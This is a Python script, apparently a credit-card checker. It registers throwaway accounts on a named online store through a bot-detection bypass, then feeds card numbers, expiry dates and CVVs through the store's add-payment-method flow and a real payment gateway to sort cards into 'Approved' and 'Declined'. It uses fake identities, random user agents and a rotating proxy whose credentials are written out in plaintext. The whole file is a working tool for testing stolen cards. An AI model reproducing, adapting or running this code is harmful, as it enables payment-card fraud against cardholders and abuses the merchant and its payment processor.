import base64
import random
import uuid
import datetime
from bs4 import BeautifulSoup
import names
from faker import Faker
from fake_useragent import UserAgent
from requests import Session
from dataclasses import dataclass
import time
from selenium.webdriver.common.by import By
import requests
import time
import requests
from bs4 import BeautifulSoup
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from bypasss import obtener_driver_autorizado

# Importamos la función de nuestro archivo bypass.py
from bypasss import obtener_driver_autorizado 

def generate_usa_address():
	fake = Faker('en_US')
	try:
		first_name = fake.first_name()
		last_name = fake.last_name()
		return {
			"firstname": first_name,
			"lastname": last_name,
			"email": f"{first_name.lower()}{last_name.lower()}{fake.random_number(digits=3)}@{fake.free_email_domain()}",
			"street": (f"{random.randint(1000, 9999)} {random.choice(['nw', 'sw', 'ne', 'se'])} {random.randint(1, 100)}th {random.choice(['st', 'ave', 'blvd', 'rd'])}"),
			"city": fake.city(),
			"state": fake.state_abbr(),
			"postcode": str(random.randint(33100, 33199)),
			"telephone": fake.numerify('305#######'),
			"date": (datetime.datetime.now(datetime.UTC).strftime('%Y-%m-%dT%H:%M:%S.') + f'{int((datetime.datetime.now(datetime.UTC).microsecond) / 1000):03d}Z')

		}
	except KeyError:
		return generate_usa_address()


class ConfigsPAge:
    @classmethod
    
    def QueryText(self, data:str=None, chainOne:str=None, chainTwo:str=None):

        try:               return data[ data.index(chainOne) + len (chainOne):data.index(chainTwo,  data.index(chainOne) + len (chainOne))]
        except ValueError: return None 

    def Ccs(self, cards:str=None):
        if '|' in cards: 
            return cards.split('|')
        elif ':' in cards: 
            return cards.split(':')
        elif ',' in cards: 
            return cards.split(',')
        elif '-' in cards: return cards.split('-')

        return cards


    @classmethod
    def RandomName(self, dato: str = None):
        if dato == 'email':
            self.email = "{}{}{}@gmail.com".format(
                names.get_first_name(),
                names.get_last_name(),
                random.randint(1000000, 9999999)
            )
            return self.email
        
        else:
            return 'Valores incorrectos: >>>   ConfigsPAge().RandomName("username")'

    def SaveResponseHtml(self, response: str):
        try:
            with open("ResponseHtml.html", "w", encoding="utf-8") as f:
                f.write(response)
        except Exception as e:
            print(f"Error guardando el archivo: {e}")

# Proxy
proxy_url = 'http://oplljqes-rotate:1c4zw3p5n0yv@p.webshare.io:80'

@dataclass
class b3:
    def main(self, card):
        try:
            self.Nombre = ConfigsPAge().RandomName('username')
            self.UseMail = ConfigsPAge().RandomName('email')
            firstname, lastname, email, phone, street, postcode, date = (generate_usa_address().get(k, '') for k in ['firstname', 'lastname', 'email', 'telephone', 'street', 'postcode', 'date'])
            self.ua = UserAgent().random
            self.ccs = card.split('|')

            if self.ccs[0].startswith("4"): self.brand = "VI"
            if self.ccs[0].startswith("3"): self.brand = "AE"
            elif self.ccs[0].startswith("5"): self.brand = "MC"
            # =====================================================================
            # 1. EL NAVEGADOR HACE EL REGISTRO (PARA INICIAR SESIÓN REAL)
            # =====================================================================
            url_inicio = "https://store.graniteind.com/my-account/"
            driver = obtener_driver_autorizado(url_inicio)

            try:
                wait = WebDriverWait(driver, 15)
                
                print("Escribiendo correo en el navegador...")
                # Buscamos el campo de registro en el navegador
                email_input = wait.until(EC.visibility_of_element_located((By.ID, "reg_email")))
                
                # Generamos un correo dinámico para evitar errores de "cuenta existente"
                correo_aleatorio = f"brayan_test_{int(time.time())}@gmail.com"
                email_input.clear()
                email_input.send_keys(correo_aleatorio)
                
                print(f"Registrando cuenta: {correo_aleatorio}")
                # Hacemos clic en el botón de registrar desde el navegador
                btn_registrar = driver.find_element(By.NAME, "register")
                btn_registrar.click()
                
                # Esperamos a que la página recargue y estemos dentro de la cuenta (dashboard)
                print("Esperando inicio de sesión activo...")
                wait.until(EC.url_contains("/my-account/"))
                print("¡Sesión iniciada con éxito en el navegador!")

                # =====================================================================
                # 2. CAPTURAR COOKIES DE LA SESIÓN YA LOGUEADA
                # =====================================================================
                cookies_navegador = driver.get_cookies()
                user_agent_autorizado = driver.execute_script("return navigator.userAgent;")

            finally:
                # Cerramos el navegador de inmediato. Ya estamos logueados y tenemos las cookies.
                print("Cerrando navegador...")
                driver.quit()

            # =====================================================================
            # 3. TRASPASAR TODO A REQUESTS Y CONTINUAR TU CÓDIGO NORMAL
            # =====================================================================
            session = requests.Session()
            session.headers.update({'user-agent': user_agent_autorizado})

            for cookie in cookies_navegador:
                session.cookies.set(
                    cookie['name'], 
                    cookie['value'], 
                    domain=cookie.get('domain', 'store.graniteind.com')
                )

            print("¡Sesión de requests sincronizada y LOGUEADA!")

            # --- Petición 3 (Tu Petición Base): Obtener Nonce de Método de Pago ---
            headers_get_payment = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-419,es;q=0.9',
                'referer': 'https://store.graniteind.com/my-account/',
                'upgrade-insecure-requests': '1',
                'user-agent': user_agent_autorizado, 
            }

            # Hacemos la petición directamente a la zona de pagos
            r3 = session.get('https://store.graniteind.com/my-account/add-payment-method/', headers=headers_get_payment)

            payment_nonce = ConfigsPAge().QueryText(r3.text, 'name="woocommerce-add-payment-method-nonce" value="', '"')
            print(f"Payment Nonce: {payment_nonce}")

            # =====================================================================
            # DE AQUÍ EN ADELANTE TU CÓDIGO SIGUE EXACTAMENTE IGUAL (r4, r5, r6...)
            # =====================================================================
            headers = {'accept': '*/*','accept-language': 'es-419,es;q=0.9','priority': 'u=1, i','referer': 'https://store.graniteind.com/my-account/add-payment-method/','user-agent': user_agent_autorizado,}
            params = {'wc-api': 'WC_APS_Gateway','apsFormValuesJson': '{"billing_first_name":"Brayan","billing_last_name":"Cervantes","billing_company":"","billing_country":"Estados Unidos","billing_address_1":"444 Alaska Avenue","billing_address_2":"Suite #CJP293","billing_city":"Torrance","billing_state":"California","billing_postcode":"90503","ship_to_different_address":false}',}
            r4 = session.get('https://store.graniteind.com/', params=params, headers=headers)
            token = ConfigsPAge().QueryText(r4.text,'','&')
            print(token)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','priority': 'u=0, i','referer': 'https://store.graniteind.com/','upgrade-insecure-requests': '1','user-agent': user_agent_autorizado,}
            params = {'tokenId': token,'amount': '0.00','topMargin': '80','': '',}
            r5 = session.get('https://portal.apsclicktopay.com/EasyPay/JsPayStep2', params=params, headers=headers)

            mm = self.ccs[1].zfill(2)
            yy = self.ccs[2][-2:]

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://portal.apsclicktopay.com','priority': 'u=0, i','referer': 'https://portal.apsclicktopay.com/','upgrade-insecure-requests': '1','user-agent': user_agent_autorizado,}
            data = {'billing-cc-number': self.ccs[0].replace(' ', ''),'billing-cc-exp': f'{self.ccs[1]}/{self.ccs[2]}','billing-cvv': self.ccs[3],}
            r6 = session.post(f'https://gateway.repay.com/api/v2/three-step/{token}', headers=headers, data=data)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','cache-control': 'max-age=0','priority': 'u=0, i','referer': 'https://portal.apsclicktopay.com/','upgrade-insecure-requests': '1','user-agent': user_agent_autorizado,}
            params = {'token-id': token,}
            r7 = session.get('https://portal.apsclicktopay.com/EasyPay/JsRedirectReceiver', params=params, headers=headers)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://store.graniteind.com','priority': 'u=0, i','referer': 'https://store.graniteind.com/my-account/add-payment-method/','upgrade-insecure-requests': '1','user-agent': user_agent_autorizado,}
            data = {'payment_method': 'aps','billing_first_name': 'Brayan','billing_last_name': 'Cervantes','billing_company': '','billing_country': 'Estados Unidos','billing_address_1': '444 Alaska Avenue','billing_address_2': 'Suite #CJP293','billing_city': 'Torrance','billing_state': 'California','billing_postcode': '90503','apsSavedVaultIdentifier': '','isEnableValidateCvv': '1','validateCvvTheme': 'repay_only_cvv','successMessageAfterValidatingCvv': 'CVV has been successfully validated.','apsTokenId': '','apsTokenIdB': token,'apsFormValuesJson': '{"billing_first_name":"Brayan","billing_last_name":"Cervantes","billing_company":"","billing_country":"Estados Unidos","billing_address_1":"444 Alaska Avenue","billing_address_2":"Suite #CJP293","billing_city":"Torrance","billing_state":"California","billing_postcode":"90503","ship_to_different_address":false}','isCheckout': '','woocommerce-add-payment-method-nonce': payment_nonce,'_wp_http_referer': '/my-account/add-payment-method/','woocommerce_add_payment_method': '1',}
            r8 = session.post('https://store.graniteind.com/my-account/add-payment-method/',headers=headers, data=data,)
            session.close()
            soup = BeautifulSoup(r8.text, 'html.parser')
            error_ul = soup.find('ul', class_='woocommerce-error', role='alert')

            if error_ul:
                first_li = error_ul.find('li')
                if first_li and first_li.text.strip():
                    error_message = first_li.text.strip()

                    if 'Payment method successfully added.' in error_message:
                        return 'Approved! ✅', 'Charged $0.01' 
                    if 'CVV2 Mismatch' in error_message:
                        return 'Approved! ✅', 'CVV2 Mismatch'
                    if 'Invalid CVV' in error_message:
                        return 'Approved! ✅', 'Invalid CVV'

                    return 'Declined! ❌', error_message

            return 'Declined! ❌', 'No such issuer'
        except: return 'Declined! ❌','Declined - No such issuer'
        
               


ccs = input('Card: ')
chk = b3().main(ccs)
print(chk)
